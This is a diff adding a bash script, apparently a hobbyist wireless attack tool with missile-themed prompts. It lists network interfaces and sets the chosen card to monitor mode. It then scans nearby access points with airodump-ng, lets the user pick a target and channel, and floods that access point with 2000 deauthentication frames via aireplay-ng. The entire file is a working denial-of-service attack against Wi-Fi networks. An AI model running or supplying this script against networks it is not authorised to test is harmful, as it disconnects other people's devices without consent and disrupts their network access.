@@ -1,0 +1,40 @@
+#!/bin/bash
+
+tput setaf 2;tput bold;
+cat .aircraft_ascii
+tput setaf 7;
+tput bold;
+echo -e "Select your Missile:"
+ifconfig | grep wlan | cut -d " " -f 1 | nl
+read -e -p ">>> " -n2 option
+wifi=`ifconfig | grep wlan | cut -d " " -f 1 | awk 'NR=="'$option'"{print $1}'`
+src_mac=`ifconfig $wifi | awk '/HWaddr/ {print $5}'`
+ifconfig $wifi down
+iwconfig $wifi mode monitor
+airodump-ng $wifi -w tempdump
+trap ctrl_c INT
+clear
+echo -e "`tput setaf 3;`[-][-][-] Select Your Target or Type 'q' to Holster::`tput setaf 7;`\n"
+cat tempdump-01.csv | awk -F "," '{ print $1$4$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | nl;echo ''
+read -e -p ">>> " -n3 tempmacid
+if [[ $tempmacid == 'q' ]]; then
+	rm tempdump*
+	exit
+else
+	mac_id=`cat tempdump-01.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | awk 'NR=="'$tempmacid'"{ print $1 }'`
+#        mac_id=`echo ${tempmacid:0:2}:${tempmacid:2:2}:${tempmacid:4:2}:${tempmacid:6:2}:${tempmacid:8:2}:${tempmacid:10:2}`
+fi;
+echo -e ""
+rm tempdump*
+read -e -p "Enter Channel>>> " -n3 chnl; echo -e ''
+ifconfig $wifi down
+iwconfig $wifi mode monitor
+ifconfig $wifi up
+iwconfig $wifi channel $chnl
+echo -e "`tput setaf 2;`Dropping WarHeads...\n`tput setaf 7;`"
+tput bold;tput setaf 1;aireplay-ng --deauth 2000 -a $mac_id -h $src_mac $wifi --ignore-negative-one;tput setaf 7;
+airmon-ng stop $wifi
+ifconfig $wifi up
+
+#Just for test purposes
+#cat test.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID\|Station/!p'
